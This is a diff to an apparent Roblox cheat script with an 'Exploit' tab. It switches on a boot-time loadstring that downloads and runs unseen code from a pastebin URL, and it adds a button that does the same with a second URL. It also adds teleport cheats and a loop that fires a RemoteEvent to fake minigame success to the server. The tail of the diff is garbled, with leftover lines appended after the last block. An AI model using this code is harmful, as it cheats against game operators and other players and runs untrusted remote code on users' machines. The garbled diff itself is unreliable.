@@ -41,7 +41,7 @@ local Window = Rayfield:CreateWindow({
    }
 })
 -- booting
---loadstring(game:HttpGet("https://pastebin.com/raw/JJh2xXEk"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/JJh2xXEk"))()
 local t1 = Window:CreateTab("⚙️ | Basic Hacks", 4483362458)
 local t3 = Window:CreateTab("🥽 | ESP", 4483362458)
 local t4 = Window:CreateTab("👨‍💻 | Exploit", 4483362458)
@@ -332,6 +332,137 @@ t4:CreateButton({
                 Content = "OBSpawnPad não encontrado.",
                 Duration = 4,
                 Image = "error",
+            })
+        end
+   end,
+})
+
+-- Função recursiva para encontrar todos os modelos com um dado nome
+local function findAllModelsByName(parent, name)
+    local models = {}
+    for _, obj in pairs(parent:GetChildren()) do
+        if obj.Name == name and obj:IsA("Model") then
+            table.insert(models, obj)
+        end
+        if #obj:GetChildren() > 0 then
+            local foundModels = findAllModelsByName(obj, name)
+            for _, found in pairs(foundModels) do
+                table.insert(models, found)
+            end
+        end
+    end
+    return models
+end
+
+-- Lista para evitar repetir computadores recentes
+local recentComputers = {}
+
+-- Função que retorna um computador aleatório diferente dos recentes
+local function getRandomComputer()
+    local computerModels = findAllModelsByName(workspace, "ComputerTable")
+    if #computerModels == 0 then
+        return nil
+    end
+
+    local validComputers = {}
+    for _, computer in pairs(computerModels) do
+        if not table.find(recentComputers, computer) then
+            table.insert(validComputers, computer)
+        end
+    end
+
+    if #validComputers == 0 then
+        -- Se todos foram usados recentemente, reseta a lista para permitir repetir
+        recentComputers = {}
+        validComputers = computerModels
+    end
+
+    local randomIndex = math.random(1, #validComputers)
+    return validComputers[randomIndex]
+end
+
+-- Botão na aba Exploit (t4) para teleportar para PC aleatório
+t4:CreateButton({
+    Name = "TP to random PC",
+    Callback = function()
+        local playerLocal = game.Players.LocalPlayer
+        local characterLocal = playerLocal.Character or playerLocal.CharacterAdded:Wait()
+        local rootPart = characterLocal:WaitForChild("HumanoidRootPart")
+
+        local chosenComputer = getRandomComputer()
+
+        if chosenComputer and chosenComputer.PrimaryPart then
+            local targetPos = chosenComputer.PrimaryPart.Position + Vector3.new(0, 5, 0)
+            rootPart.CFrame = CFrame.new(targetPos)
+
+            table.insert(recentComputers, chosenComputer)
+            if #recentComputers > 3 then
+                table.remove(recentComputers, 1)
+            end
+        else
+            Rayfield:Notify({
+                Title = "TP to PC",
+                Content = "No computers found to teleport!",
+                Duration = 4,
+                Image = "error",
+            })
+        end
+    end,
+})
+
+t4:CreateButton({
+    Name = "Anti PC Error",
+    Callback = function()
+        _G.AutomaticHackingEnabled = not _G.AutomaticHackingEnabled
+
+        Rayfield:Notify({
+            Title = "Anti-PC-Error",
+            Content = _G.AutomaticHackingEnabled and "Enabled." or "Disabled.",
+            Duration = 6.5,
+            Image = 4483362458,
+        })
+
+        if _G.AutomaticHackingEnabled then
+            spawn(function()
+                while _G.AutomaticHackingEnabled do
+                    wait(0.25)
+                    local args = {
+                        "SetPlayerMinigameResult",
+                        true
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
+                end
+            end)
+        end
+    end,
+})
+
+t4:CreateButton({
+   Name = "TP to random Exit",
+   Callback = function()
+        local exitDoorModels = findAllModelsByName(game.Workspace, "ExitDoor")
+
+        if #exitDoorModels > 0 then
+            local randomIndex = math.random(1, #exitDoorModels)
+            local exitDoor = exitDoorModels[randomIndex]
+
+            local playerLocal = game.Players.LocalPlayer
+            local characterLocal = playerLocal.Character or playerLocal.CharacterAdded:Wait()
+            local rootPart = characterLocal:WaitForChild("HumanoidRootPart")
+
+            local pivotCFrame = exitDoor:GetPivot()
+            local behindDoorCFrame = pivotCFrame * CFrame.new(0, 0, -5)
+            rootPart.CFrame = behindDoorCFrame
+        end
+   end,
+})
+t4:CreateSection("Others")
+t4:CreateButton({
+   Name = "Remote audio control",
+   Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/3dWP6BW4"))()
+   end,
+})                Image = "error",
             })
         end
    end,
